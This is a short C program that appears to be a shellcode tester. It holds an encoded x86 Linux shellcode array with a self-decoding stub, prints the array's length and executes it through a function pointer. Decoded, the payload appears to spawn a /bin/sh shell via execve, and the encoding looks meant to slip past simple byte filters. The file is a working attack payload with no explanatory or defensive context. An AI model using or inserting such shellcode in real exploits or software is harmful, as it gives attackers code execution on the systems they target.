#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x0c\x5e\x31\xc9\xb1\x19\xfe\x0e\x46\xe2\xfb\xeb\x05\xe8\xef\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x8a\xe3\x54\x8a\xe2\xb1\x0c\xce\x81";


main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	